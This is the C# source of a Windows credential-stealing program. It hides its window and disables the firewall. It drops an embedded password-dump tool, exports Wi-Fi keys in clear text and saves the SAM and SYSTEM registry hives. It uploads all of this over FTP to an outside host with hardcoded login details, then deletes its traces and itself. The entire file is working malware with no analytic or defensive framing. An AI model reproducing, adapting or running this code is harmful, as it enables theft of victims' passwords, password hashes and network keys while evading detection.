using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
#pragma warning disable SYSLIB0014 
namespace a
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static string username = Environment.UserName;
        public static string tmppath = Path.GetTempPath();
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            string username = Environment.UserName;
            string tmppath = Path.GetTempPath();
            Delete();
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            Stream? resourceStream = currentAssembly.GetManifestResourceStream("a.cp.exe");
            if (resourceStream != null)
            {
                using (resourceStream)
                {
                    byte[] resourceBytes = new byte[resourceStream.Length];
                    resourceStream.Read(resourceBytes, 0, resourceBytes.Length);
                    File.WriteAllBytes(Path.Combine(tmppath, "cp.exe"), resourceBytes);
                }
            }
            ExecuteCommand($"netsh advfirewall set allprofiles state off;cd {tmppath};./cp.exe /stext {username};netsh wlan export profile key=clear;reg save HKLM\\sam ./sam{username}.save; reg save HKLM\\system ./system{username}.save");
            var client = new WebClient();
            client.Credentials = new NetworkCredential("hack123", "Dr0bnyy");
            client.UploadFile(new Uri($"ftp://konik.endora.cz/{username}"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, username));
            client.UploadFile(new Uri($"ftp://konik.endora.cz/sam{username}.save"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"sam{username}.save"));
            client.UploadFile(new Uri($"ftp://konik.endora.cz/system{username}.save"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"system{username}.save"));
            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
                client.UploadFile(new Uri($"ftp://konik.endora.cz/{file.Substring(file.LastIndexOf('\\') + 1)}"), WebRequestMethods.Ftp.UploadFile, file);
            Delete();
            string batchCommands = string.Empty;
            var process = Process.GetCurrentProcess().MainModule;
            string exeFileName = process != null ? process.FileName : $"C:\\\\Users\\\\{username}\\\\Desktop\\\\a.exe";
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exeFileName + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }
        private static void Delete()
        {
            if (File.Exists(Path.Combine(tmppath, "cp.exe")))
                File.Delete(Path.Combine(tmppath, "cp.exe"));
            if (File.Exists(Path.Combine(tmppath, $"system{username}.save")))
                File.Delete(Path.Combine(tmppath, $"system{username}.save"));
            if (File.Exists(Path.Combine(tmppath, $"sam{username}.save")))
                File.Delete(Path.Combine(tmppath, $"sam{username}.save"));
            if (File.Exists(Path.Combine(tmppath, username)))
                File.Delete(Path.Combine(tmppath, username));
            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
                if (File.Exists(file))
                    File.Delete(file);
        }
        private static void ExecuteCommand(string command)
        {
            var processStartInfo = new ProcessStartInfo();
            processStartInfo.Verb = "runas";
            processStartInfo.FileName = "powershell.exe";
            processStartInfo.Arguments = $"-Command \"{command}\"";
            processStartInfo.UseShellExecute = false;
            processStartInfo.RedirectStandardOutput = true;

            using var process = new Process();
            process.StartInfo = processStartInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
        }
    }
}
